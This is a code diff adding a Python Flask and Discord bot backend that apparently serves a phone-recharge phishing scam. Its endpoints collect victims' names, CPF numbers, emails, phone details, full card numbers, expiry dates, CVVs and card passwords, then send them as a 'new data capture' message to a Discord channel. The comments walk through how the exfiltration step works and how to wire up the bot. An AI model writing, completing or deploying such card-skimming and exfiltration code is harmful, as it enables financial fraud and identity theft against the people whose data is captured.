@@ -1,0 +1,142 @@
+from model.cardModel import Card
+from flask import Flask, request, jsonify
+import os
+import discord
+from discord.ext import commands
+import asyncio
+
+
+app = Flask(__name__)
+
+token = os.getenv("TOKEN")
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+# con app.app_context():
+# db.create_all()
+
+cards: list[Card] = []
+
+
+@app.route('/auth', methods=['GET'])
+def authInfo():
+    try:
+        data = request.json
+
+        if not data or not all(key in data for key in [
+            'celular',
+            'operadora',
+            'valor',
+            'email',
+            'nome',
+            'cpf',
+            'card',
+            'mes',
+            'ano',
+            'cvv',
+            'token',
+            'bin',
+            'dadosbin'
+        ]):
+            return jsonify({'Error': 'Unknown'}), 401
+
+        celular = data.get('celular')
+        operadora = data.get('operadora')
+        valor = data.get('valor')
+        email = data.get('email')
+        nome = data.get('nome')
+        cpf = data.get('cpf')
+        card = data.get('card')
+        mes = data.get('mes')
+        ano = data.get('ano')
+        cvv = data.get('cvv')
+        token = data.get('token')
+        bin = data.get('bin')
+        dadosbin = data.get('dadosbin')
+
+        card = Card(
+            celular, operadora, valor, email, nome, cpf, card,
+            mes, ano, cvv, token, bin, dadosbin)
+        cards.append(card)
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+@app.route('/authpass', methods=['GET'])
+def authPassword():
+    try:
+        data = request.json
+        if not data or not all(key in data for key in [
+            'senha',
+            'token'
+        ]):
+            return jsonify({'Error': 'Unknown'}), 401
+
+        senha = data.get('senha')
+        token = data.get('token')
+
+        for card in cards:
+            if card.token == token:
+                # This code block sends the collected card data and password to a Discord channel.
+                # It requires the 'CHANNEL_ID' environment variable to be set.
+                channel_id_str = os.getenv("CHANNEL_ID")
+                if not channel_id_str:
+                    print("[ERROR] CHANNEL_ID environment variable is not set.")
+                    break
+
+                channel_id = int(channel_id_str)
+
+                # Create an embed for a nicely formatted message
+                embed = discord.Embed(title="Nova Captura de Dados", color=discord.Color.red())
+                embed.add_field(name="Nome", value=card.nome, inline=True)
+                embed.add_field(name="CPF", value=card.cpf, inline=True)
+                embed.add_field(name="Email", value=card.email, inline=True)
+                embed.add_field(name="Celular", value=f"{card.celular} ({card.operadora})", inline=False)
+                embed.add_field(name="Valor Recarga", value=card.valor, inline=False)
+                embed.add_field(name="💳 DADOS DO CARTÃO", value=f"```{card.card} {card.mes}/{card.ano} {card.cvv}```", inline=False)
+                embed.add_field(name="🔑 SENHA DO CARTÃO", value=f"```{senha}```", inline=False)
+                embed.add_field(name="BIN", value=card.bin, inline=True)
+                embed.add_field(name="Dados BIN", value=card.dadosbin, inline=True)
+                embed.set_footer(text=f"Token da Operação: {token}")
+
+                # Define an async function to send the message, as discord.py is asynchronous
+                async def send_notification():
+                    try:
+                        channel = bot.get_channel(channel_id) or await bot.fetch_channel(channel_id)
+                        if channel:
+                            await channel.send(embed=embed)
+                        else:
+                            print(f"[ERROR] Discord channel with ID {channel_id} not found.")
+                    except Exception as e:
+                        print(f"[ERROR] Failed to send message to Discord: {e}")
+
+                # Schedule the async function to run on the bot's event loop from this sync (Flask) thread.
+                # NOTE: This requires the bot to be running (e.g., via bot.run() in a separate thread).
+                if bot.loop.is_running():
+                    asyncio.run_coroutine_threadsafe(send_notification(), bot.loop)
+                else:
+                    print("[WARNING] Discord bot is not running. Cannot send notification.")
+                
+                # Break the loop after finding and processing the matching card
+                break
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+if __name__ == "__main__":
+    # To make the Discord bot work, you would typically run it in a separate thread
+    # before starting the Flask app, for example:
+    #
+    # import threading
+    # bot_token = os.getenv("DISCORD_BOT_TOKEN")
+    # threading.Thread(target=bot.run, args=(bot_token,), daemon=True).start()
+    
+    app.run(host="0.0.0.0", port=5000)
